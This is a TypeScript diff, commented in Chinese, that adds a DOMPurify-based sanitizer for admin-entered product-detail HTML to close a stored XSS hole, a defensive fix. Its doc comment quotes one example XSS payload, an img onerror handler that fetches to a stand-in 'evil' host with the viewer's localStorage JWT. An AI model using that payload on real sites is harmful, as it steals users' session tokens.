@@ -112,3 +112,25 @@ export function renderMarkdown(content: string, citationCount = 0): string {
   // 除白名单放行外不做任何放宽 —— 不信任模型输出这一条不因为放行一个属性而改变
   return DOMPurify.sanitize(html, { ADD_ATTR: ['target'] })
 }
+
+/**
+ * 消毒后台录入的富文本片段，产出可直接 v-html 的 HTML 字符串。
+ *
+ * 与 renderMarkdown 的区别：这里的内容**不是**模型输出，而是运营在管理端
+ * 自由输入的 HTML，所以不能走 markdown 渲染（`<p>` 会被再包一层）。
+ * 但「不信任」这条前提完全一样 —— 它能被任何拿到管理端的人写进去，
+ * 而浏览该商品的是普通用户。此前这里直接 v-html，等于把详情页当成
+ * 存储型 XSS 的投放点：`<img src=x onerror=fetch('//evil/'+localStorage.token)>`
+ * 会窃取每一个浏览者的 JWT（token 存在 localStorage）。
+ *
+ * 前端消毒是兜底而非替代：后端输出侧仍应做净化。两层都做，是因为
+ * 任何一层被绕过时另一层还在 —— 而这里最便宜的那层此前是缺的。
+ */
+export function sanitizeRichHtml(html: string): string {
+  if (!html) {
+    return ''
+  }
+  // ADD_ATTR target：与 markdown 路径保持一致，运营在详情里写的
+  // 外链也应新开页。除白名单放行外不做任何放宽。
+  return DOMPurify.sanitize(html, { ADD_ATTR: ['target'] })
+}
